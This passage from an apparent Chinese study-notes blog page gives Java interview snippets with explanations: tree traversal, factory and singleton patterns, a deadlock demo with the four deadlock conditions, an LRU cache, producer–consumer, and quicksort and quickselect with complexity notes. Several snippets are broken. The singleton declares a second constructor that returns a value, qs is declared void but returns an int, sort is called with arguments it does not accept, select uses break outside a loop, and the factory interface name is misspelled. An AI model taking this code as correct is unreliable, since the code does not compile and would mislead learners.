class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        Stack&lt;TreeNode&gt; s2 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        s1.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> s1.pop();</span><br><span class="line">            s2.push(tmp);</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="literal">null</span>) s1.push(tmp.left);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="literal">null</span>) s1.push(tmp.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!s2.isEmpty()) res.add(s2.pop().val);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="设计模式">设计模式</span></h1><h2><span id="工厂模式">工厂模式</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FoodFactroy</span>&#123;</span><br><span class="line">    Food <span class="title function_">makeFood</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChineseFoodFactory</span> <span class="keyword">implements</span> <span class="title class_">FoodFactory</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeFood</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;A&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodA</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodB</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AmericanFoodFactory</span> <span class="keyword">implements</span> <span class="title class_">FoodFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeFood</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AmericanFoodA</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AmericanFoodB</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 先选择一个具体的工厂</span></span><br><span class="line">        <span class="type">FoodFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodFactory</span>();</span><br><span class="line">        <span class="comment">// 由第一步的工厂产生具体的对象，不同的工厂造出不一样的对象</span></span><br><span class="line">        <span class="type">Food</span> <span class="variable">food</span> <span class="operator">=</span> factory.makeFood(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="单例模式">单例模式</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton.class)&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance==<span class="literal">null</span>)&#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个 if 语句用来避免 uniqueInstance 已经被实例化之后的加锁操作，而第二个 if 语句进行了加锁，所以只能有一个线程进入，就不会出现 uniqueInstance &#x3D;&#x3D; null 时两个线程同时进行实例化操作。</p><p>的， uniqueInstance &#x3D; new Singleton(); 这段代码其实是分为三步执行：</p><ol><li>为 uniqueInstance 分配内存空间</li><li>初始化 uniqueInstance</li><li>将 uniqueInstance 指向分配的内存地址</li></ol><p>使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。</p><h1><span id="算法">算法</span></h1><h2><span id="死锁">死锁</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLock</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Object lock1=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Object lock2=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">A</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">B</span>()).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(DeadLock.lock1)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;A get lock1&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (DeadLock.lock2)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;A get lock2&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(DeadLock.lock2)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;B get lock2&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (DeadLock.lock1)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;B get lock1&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="一什么是死锁">一.什么是死锁？</span></h3><p>　　　死锁是由于两个或以上的线程互相持有对方需要的资源，导致这些线程处于等待状态，无法执行。</p><h3><span id="二产生死锁的四个必要条件">二.产生死锁的四个必要条件</span></h3><p>　　　1.互斥性：线程对资源的占有是排他性的，一个资源只能被一个线程占有，直到释放。</p><p>　　　2.请求和保持条件：一个线程对请求被占有资源发生阻塞时，对已经获得的资源不释放。</p><p>　　　3.不剥夺：一个线程在释放资源之前，其他的线程无法剥夺占用。</p><p>　　　4.循环等待：发生死锁时，线程进入死循环，永久阻塞。</p><h3><span id="三避免死锁的方法">三.避免死锁的方法</span></h3><h4><span id="1破坏请求和保持条件">1.破坏“请求和保持”条件</span></h4><p>　　　　一次性申请所有需要用到的资源，不要一次一次来申请，当申请的资源有一些没空，那就让线程等待。不过这个方法比较浪费资源，进程可能经常处于饥饿状态。还有一种方法是，要求进程在申请资源前，要释放自己拥有的资源。</p><h4><span id="2破坏不可抢占条件">2.破坏“不可抢占”条件</span></h4><p>　　　　允许进程进行抢占，方法一：如果去抢资源，被拒绝，就释放自己的资源。方法二：操作系统允许抢，只要你优先级大，可以抢到。</p><h4><span id="3破坏循环等待条件">3.破坏“循环等待”条件</span></h4><p>　　　　将系统中的所有资源统一编号，进程可在任何时刻提出资源申请，但所有申请必须按照资源的编号顺序（升序）提出</p><h2><span id="lru">LRU</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="type">int</span> cap,count;</span><br><span class="line">    HashMap&lt;Integer,Node&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    Node head,tail;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        Node pre,next;</span><br><span class="line">        <span class="type">int</span> val,key;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> value)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.key=key;</span><br><span class="line">            <span class="built_in">this</span>.val=value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        cap=capacity;</span><br><span class="line">        count=<span class="number">0</span>;</span><br><span class="line">        head=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        tail=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        head.next=tail;</span><br><span class="line">        tail.pre=head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">n</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="literal">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        remove(n);</span><br><span class="line">        add(n);</span><br><span class="line">        <span class="keyword">return</span> n.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">n</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="literal">null</span>)&#123;</span><br><span class="line">            n = <span class="keyword">new</span> <span class="title class_">Node</span>(key,value);</span><br><span class="line">            map.put(key,n);</span><br><span class="line">            add(n);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            n.val=value;</span><br><span class="line">            remove(n);</span><br><span class="line">            add(n);</span><br><span class="line">        &#125;<span class="keyword">if</span>(count&gt;cap)&#123;</span><br><span class="line">            Node del=tail.pre;</span><br><span class="line">            remove(del);</span><br><span class="line">            map.remove(del.key);</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        Node after=head.next;</span><br><span class="line">        head.next=n;</span><br><span class="line">        n.pre=head;</span><br><span class="line">        n.next=after;</span><br><span class="line">        after.pre=n;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">         Node before=n.pre,after=n.next;</span><br><span class="line">         before.next=after;</span><br><span class="line">         after.pre=before;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="生产者消费者">生产者消费者</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClothesFactory</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> size=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">produce</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(list)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list.size()&gt;=size)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    list.wait();</span><br><span class="line">                &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.addFirst(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">comsume</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(list)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list.size()&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    list.wait();</span><br><span class="line">                &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.removeLast();</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"><span class="keyword">private</span> ClothesFactory clothesFactory;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(ClothesFactory clothesFactory)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.clothesFactory=clothesFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                clothesFactory.produce();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Comsumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"><span class="keyword">private</span> ClothesFactory clothesFactory;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Comsumer</span><span class="params">(ClothesFactory clothesFactory)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.clothesFactory=clothesFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                clothesFactory.comsume();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="排序">排序</span></h1><p>分析时间复杂度</p><h2><span id="快排">快排 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> qs(a,lo,hi);</span><br><span class="line">        sort(a,lo,mid-<span class="number">1</span>);</span><br><span class="line">        sort(a,mid+<span class="number">1</span>,hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">qs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">    <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x)j--;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x)i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[j]=a[i];        </span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=x;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="1-最优情况">1、最优情况</span></h3><p>在最优情况下，Partition每次都划分得很均匀，如果排序n个关键字，其递归树的深度就为 [log2n]+1（ [x] 表示不大于 x 的最大整数），即仅需递归 log2n 次，需要时间为T（n）的话，第一次Partiation应该是需要对整个数组扫描一遍，做n次比较。然后，获得的枢轴将数组一分为二，那么各自还需要T（n&#x2F;2）的时间（注意是最好情况，所以平分两半）。于是不断地划分下去，就有了下面的不等式推断：</p><p><img src="http://img.blog.csdn.net/20140522095848359?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvb29oYWhhXzEyMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><h3><span id="2-最糟糕情况">2、最糟糕情况</span></h3><p>然后再来看最糟糕情况下的快排，当待排序的序列为正序或逆序排列时，且每次划分只得到一个比上一次划分少一个记录的子序列，注意另一个为空。如果递归树画出来，它就是一棵斜树。此时需要执行n‐1次递归调用，且第i次划分需要经过n‐i次关键字的比较才能找到第i个记录，也就是枢轴的位置，因此比较次数为</p><p><img src="/2020/04/14/Exam/image-20200414160932308.png"></p><h2><span id="快速选择">快速选择 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    k--;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> qs(a,lo,hi);</span><br><span class="line">       <span class="keyword">if</span>(mid&gt;k)&#123;</span><br><span class="line">           hi=mid-<span class="number">1</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mid==k)&#123;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           lo=mid+<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">qs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">    <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x)j--;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x)i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[j]=a[i];        </span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=x;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="堆排">堆排</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span 